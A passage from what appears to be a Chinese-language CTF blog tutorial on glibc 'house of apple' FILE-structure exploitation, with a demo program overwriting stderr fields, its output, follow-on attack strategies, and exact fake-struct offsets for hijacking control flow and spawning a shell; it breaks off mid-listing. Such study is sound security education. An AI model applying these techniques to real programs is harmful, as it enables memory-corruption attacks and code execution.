class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = puts_addr + <span class="number">0x1997b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = puts_addr + <span class="number">0x199804</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = puts_addr + <span class="number">0x199830</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = puts_addr + <span class="number">0x199868</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x194ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;<span class="comment">//满足_IO_OVERFLOW (fp, EOF)</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;<span class="comment">//io_wsetb绕过</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55cfb956d2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f648b8a6ef0</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f648ba406a8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f648ba406f4</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f648ba40720</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f648ba40758</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f648ba3bdc0</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall and trigger house of apple</span><br><span class="line">===========================new value=======================</span><br><span class="line">[<span class="number">0x55cfb956d2a0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40870</span></span><br><span class="line">[<span class="number">0x55cfb956d2b0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40770</span></span><br><span class="line">[<span class="number">0x55cfb956d2c0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40770</span></span><br><span class="line">[<span class="number">0x55cfb956d2d0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40870</span></span><br><span class="line">===========================new value=======================</span><br></pre></td></tr></table></figure>
<p>可以看到_wide_data指向的连续八个size_t内存都被修改</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>从上面的分析可以，在只给了<code>1</code>次<code>largebin attack</code>的前提下，能利用<code>_IO_wstrn_overflow</code>函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当伪造两个甚至多个<code>_IO_FILE</code>结构体，并将这些结构体通过<code>chain</code>字段串联起来就能进行组合利用。基于此，有至少四种利用思路。</p>
<h3 id="思路一：修改tcache线程变量"><a href="#思路一：修改tcache线程变量" class="headerlink" title="思路一：修改tcache线程变量"></a>思路一：修改<code>tcache</code>线程变量</h3><p>该思路需要借助<code>house of pig</code>的思想，利用<code>_IO_str_overflow</code>中的<code>malloc</code>进行任意地址分配，<code>memcpy</code>进行任意地址覆盖。其代码片段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 赋值为old_buf</span></span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 这里任意地址分配</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 劫持_IO_buf_base后即可任意地址写任意值</span></span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">// .......</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>利用步骤如下：</p>
<ul>
<li>伪造至少两个<code>_IO_FILE</code>结构体</li>
<li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tcache</code>全局变量为已知值，也就控制了<code>tcache bin</code>的分配</li>
<li>第二个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_str_overflow</code>中的<code>malloc</code>函数任意地址分配，并使用<code>memcpy</code>使得能够<strong>任意地址写任意值</strong></li>
<li>利用两次任意地址写任意值修改<code>pointer_guard</code>和<code>IO_accept_foreign_vtables</code>的值绕过<code>_IO_vtable_check</code>函数的检测（或者利用一次任意地址写任意值修改<code>libc.got</code>里面的函数地址，很多<code>IO</code>流函数调用<code>strlen/strcpy/memcpy/memset</code>等都会调到<code>libc.got</code>里面的函数）</li>
<li>利用一个<code>_IO_FILE</code>，随意伪造<code>vtable</code>劫持程序控制流即可</li>
</ul>
<p>因为可以已经任意地址写任意值了，所以这可以控制的变量和结构体非常多，也非常地灵活，需要结合具体的题目进行利用，比如题目中<code>_IO_xxx_jumps</code>映射的地址空间可写的话直接修改其函数指针即可。</p>
<h3 id="思路二：修改mp-结构体"><a href="#思路二：修改mp-结构体" class="headerlink" title="思路二：修改mp_结构体"></a>思路二：修改<code>mp_</code>结构体</h3><p>该思路与上述思路差不多，不过对<code>tcachebin</code>分配的劫持是通过修改<code>mp_.tcache_bins</code>这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为<strong>线程全局变量、<code>tls</code>结构体的地址本地和远程并不一定是一样的，有时需要爆破。</strong></p>
<p>利用步骤如下：</p>
<ul>
<li>伪造至少两个<code>_IO_FILE</code>结构体</li>
<li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理</li>
<li>接下来的过程与上面的思路是一样的</li>
</ul>
<h3 id="思路三：修改pointer-guard线程变量之house-of-emma"><a href="#思路三：修改pointer-guard线程变量之house-of-emma" class="headerlink" title="思路三：修改pointer_guard线程变量之house of emma"></a>思路三：修改<code>pointer_guard</code>线程变量之<code>house of emma</code></h3><p>该思路其实就是<code>house of apple + house of emma</code>。</p>
<p>利用步骤如下：</p>
<ul>
<li>伪造两个<code>_IO_FILE</code>结构体</li>
<li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值</li>
<li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>利用即可控制程序执行流</li>
</ul>
<h3 id="思路四：修改global-max-fast全局变量"><a href="#思路四：修改global-max-fast全局变量" class="headerlink" title="思路四：修改global_max_fast全局变量"></a>思路四：修改<code>global_max_fast</code>全局变量</h3><p>这个思路也很灵活，修改掉这个变量后，直接释放超大的<code>chunk</code>，去覆盖掉<code>point_guard</code>或者<code>tcache</code>变量。我称之为<code>house of apple + house of corrision</code>。</p>
<p>利用过程与前面也基本是大同小异，就不在此详述了。</p>
<hr>
<p>其实也有其他的思路，比如还可以劫持<code>main_arena</code>，不过这个结构体利用起来会更复杂，所需要的空间将更大。而在上述思路的利用过程中，可以选择错位构造<code>_IO_FILE</code>结构体，只需要保证关键字段满足要求即可，这样可以更加节省空间。</p>
<h2 id="例题-7"><a href="#例题-7" class="headerlink" title="例题"></a>例题</h2><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h1><h2 id="概要-15"><a href="#概要-15" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在house of apple1的基础上,在只劫持<code>_wide_data</code>的条件下控制程序的执行流,<code>house of apple2</code>会提出几条新的<code>IO</code>利用链，在劫持<code>_IO_FILE-&gt;_wide_data</code>的基础上，直接控制程序执行流.</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能够泄露堆地址和libc基址</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>除了与_IO_wstrn_jumps有关的有效版本为2.36及以前,<strong>其他为ALL版本有效</strong></p>
<h2 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h2><p><code>stdin/stdout/stderr</code>这三个<code>_IO_FILE</code>结构体使用的是<code>_IO_file_jumps</code>这个<code>vtable</code>，而当需要调用到<code>vtable</code>里面的函数指针时，会使用宏去调用。以<code>_IO_file_overflow</code>调用为例，<code>glibc</code>中调用的代码片段分析如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</p>
<p>观察<code>struct _IO_wide_data</code>结构体，发现其对应有一个<code>_wide_vtable</code>成员。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，仍然以<code>vtable-&gt;_overflow</code>调用为例，所用到的宏依次为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>
<p>可以看到，在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p>
<p>因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>目前在<code>glibc</code>源码中搜索到的<code>_IO_WXXXXX</code>系列函数的调用只有<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>和<code>_IO_WOVERFLOW</code>。<br>其中<code>_IO_WSETBUF</code>和<code>_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code>_IO_FILE</code>进行利用。这里给出我总结的几条比较好利用的链。以下使用<code>fp</code>指代<code>_IO_FILE</code>结构体变量。</p>
<h3 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用_IO_wfile_overflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><p><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；</p>
<p>如果需要获得<code>shell</code>，可设置为<code>__sh\0</code>,前面两个下划线代表空格是不可或缺的,至于为什么一定要这两个空格,源于该手法对<code>flag</code>字段有要求,如果直接<code>sh</code>那么<code>flag</code>字段就不满足要求,考虑到小端序以及不对system造成影响,选择在前面加两个空格</p>
</li>
<li><p><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</p>
</li>
<li><p><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></p>
</li>
<li><p><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></p>
</li>
<li><p><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></p>
</li>
<li><p><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></p>
</li>
<li><p><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></p>
</li>
</ul>
<p>此外fsop满足的基本要求<code>_mode&lt;=0&amp;&amp;wptr&gt;wbase</code>或者另一个</p>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<p>详细分析如下：<br>首先看<code>_IO_wfile_overflow</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
<p>然后看<code>_IO_wdoallocbuf</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>
<p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p>
<h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>此外fsop满足的基本要求<code>_mode&lt;=0&amp;&amp;wptr&gt;wbase</code>或者另一个</p>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td 